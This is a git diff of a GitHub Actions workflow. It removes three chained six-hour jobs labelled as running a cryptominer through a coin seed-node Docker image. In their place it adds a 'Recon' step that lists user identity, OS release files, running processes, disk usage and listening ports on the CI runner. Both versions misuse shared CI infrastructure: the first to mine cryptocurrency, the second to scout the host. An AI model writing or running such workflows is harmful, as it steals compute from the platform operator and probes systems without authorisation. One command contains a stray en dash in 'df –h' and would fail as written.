@@ -4,20 +4,11 @@ jobs:
   Run-crypto1: #Each job can run for 6h max
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Running cryptominer"
-      - run: docker run ultimatehackingcoin/uhc-seed-node 
-      - run: sleep 6h
-  Run-crypto2:
-    runs-on: ubuntu-latest
-    needs: Run-crypto1
-    steps:
-      - run: echo "Running cryptominer"
-      - run: docker run ultimatehackingcoin/uhc-seed-node 
-      - run: sleep 6h
-  Run-crypto3:
-    runs-on: ubuntu-latest
-    needs: Run-crypto2
-    steps:
-     - run: echo "Running cryptominer"
-     - run: docker run ultimatehackingcoin/uhc-seed-node 
-     - run: sleep 6h
+      - run: echo "Recon"
+      - run: |
+            id
+            uname -a  
+            cat /etc/lsb-release /etc/redhat-release  
+            ps -ef  
+            df –h  
+            netstat -nl 
